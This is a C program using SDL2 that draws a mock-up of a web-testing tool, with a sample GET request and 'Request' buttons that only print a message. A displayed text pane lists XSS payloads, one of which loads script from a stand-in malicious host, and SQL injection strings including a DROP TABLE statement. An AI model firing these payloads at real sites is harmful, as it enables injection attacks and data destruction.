#include <SDL2/SDL.h>
#include <SDL2/SDL_ttf.h>
#include <stdbool.h>

#define WINDOW_WIDTH 800
#define WINDOW_HEIGHT 600

void handleEvents(SDL_Event e, bool* quit, SDL_Rect buttonRect, SDL_Rect requestAllButtonRect);
void renderText(SDL_Renderer* renderer, TTF_Font* font, const char* text, SDL_Rect* rect);
void okPopup();

int main(int argc, char* argv[]) {
    SDL_Init(SDL_INIT_VIDEO);
    TTF_Init();

    SDL_Window* window = SDL_CreateWindow("SDL GUI", SDL_WINDOWPOS_CENTERED, SDL_WINDOWPOS_CENTERED, WINDOW_WIDTH, WINDOW_HEIGHT, 0);
    SDL_Renderer* renderer = SDL_CreateRenderer(window, -1, SDL_RENDERER_ACCELERATED);

    TTF_Font* font = TTF_OpenFont("arial.ttf", 16); // Ensure you have this font or change to one you have

    // Define text boxes and button locations
    SDL_Rect topLeftRect = {20, 20, 360, 280};
    SDL_Rect bottomLeftRect = {20, 320, 360, 260};
    SDL_Rect buttonRect = {350, 270, 100, 50};
    SDL_Rect requestAllButtonRect = {350, 550, 100, 50};

    // Define colors
    SDL_Color black = {0, 0, 0, 255};
    SDL_Color blue = {0, 0, 255, 255};

    bool quit = false;
    SDL_Event event;

    while (!quit) {
        while (SDL_PollEvent(&event)) {
            handleEvents(event, &quit, buttonRect, requestAllButtonRect);
        }

        SDL_SetRenderDrawColor(renderer, 240, 240, 240, 255); // Light grey background
        SDL_RenderClear(renderer);

        // Render GET request and payloads
        renderText(renderer, font, "GET / HTTP/2.0\nHost: example.com", &topLeftRect);
        renderText(renderer, font, "XSS Payloads:\n\"><script>alert(1)</script>\n<script>console.log('xss')</script>\n<script src='http://malicious.com/x.js'></script>\nSQL Injections:\n' OR '1'='1\n' OR 1=1--\n'; DROP TABLE users;", &bottomLeftRect);

        // Render buttons with text
        SDL_SetRenderDrawColor(renderer, blue.r, blue.g, blue.b, blue.a);
        SDL_RenderFillRect(renderer, &buttonRect);
        SDL_RenderFillRect(renderer, &requestAllButtonRect);
        renderText(renderer, font, "Request", &buttonRect);
        renderText(renderer, font, "Request All", &requestAllButtonRect);

        SDL_RenderPresent(renderer);
    }

    TTF_CloseFont(font);
    SDL_DestroyRenderer(renderer);
    SDL_DestroyWindow(window);
    TTF_Quit();
    SDL_Quit();
    return 0;
}

void handleEvents(SDL_Event e, bool* quit, SDL_Rect buttonRect, SDL_Rect requestAllButtonRect) {
    if (e.type == SDL_QUIT) {
        *quit = true;
    } else if (e.type == SDL_MOUSEBUTTONDOWN) {
        if ((e.button.x >= buttonRect.x && e.button.x <= buttonRect.x + buttonRect.w) &&
            (e.button.y >= buttonRect.y && e.button.y <= buttonRect.y + buttonRect.h)) {
            okPopup();
        } else if ((e.button.x >= requestAllButtonRect.x && e.button.x <= requestAllButtonRect.x + requestAllButtonRect.w) &&
                   (e.button.y >= requestAllButtonRect.y && e.button.y <= requestAllButtonRect.y + requestAllButtonRect.h)) {
            okPopup();
        }
    }
}

void renderText(SDL_Renderer* renderer, TTF_Font* font, const char* text, SDL_Rect* rect) {
    SDL_Color black = {0, 0, 0, 255};
    SDL_Surface* surface = TTF_RenderText_Blended_Wrapped(font, text, black, rect->w);
    SDL_Texture* texture = SDL_CreateTextureFromSurface(renderer, surface);
    SDL_RenderCopy(renderer, texture, NULL, rect);
    SDL_DestroyTexture(texture);
    SDL_FreeSurface(surface);
}

void okPopup() {
    printf("Clicked!\n"); // Ideally, use another method or library to create actual GUI popups.
}
